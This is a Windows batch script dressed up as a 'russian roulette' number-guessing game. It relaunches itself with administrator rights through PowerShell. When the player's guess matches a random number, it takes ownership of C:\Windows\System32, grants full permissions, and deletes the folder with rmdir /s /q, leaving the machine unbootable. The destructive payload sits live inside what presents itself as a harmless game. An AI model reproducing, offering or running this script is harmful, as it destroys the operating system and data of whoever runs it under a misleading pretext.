@echo off
setlocal enabledelayedexpansion

::-------------------------This section is to run in administrator mode----------------------------------::
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c', '%~s0' -Verb RunAs"
    exit
)
::-------------------------------------------------------------------------------------------------------::

:: Do not delete the 2 lines in between NLM and NL, NL is used as new line character ::
set NLM=^


set NL=^^^%NLM%%NLM%^%NLM%%NLM%

echo ***************************************************
echo       ....Welcome to russian roulette....
echo ***************************************************

echo %NL%If you guess the same number as the system does, YOU LOSE!

:: get a random number from 1-6 ::
set /a num=%random% %%6 +1

:while_loop
    set /p guess=Enter your guess: 
    if !guess! EQU !num! (
        echo %NL%YOU LOSE 
        goto removedir
    ) else (
        echo You live! %NL%
        echo Play again?
        echo [1] Yes
        echo [2] No 
        goto read_choice
    )


:read_choice
    set /p choice=Enter choice: 
    if !choice! EQU 1 (
        goto while_loop
        timeout /t 1>nul
    ) else (
        if !choice! EQU 2 (
            goto exitloop
        ) else (
            echo Invalid choice!!
            goto read_choice
        )
    )

:: to remove system32 ::
:removedir
    echo Deleting System32!
    takeown /f "C:\Windows\System32" /r /d y
    icacls "C:\Windows\System32" /grant %username%:F /t
    rmdir /s /q "C:\Windows\System32"

:: shows loop has been exited successfully ::
:exitloop
    echo Bye Bye Loser!%NL%

@pause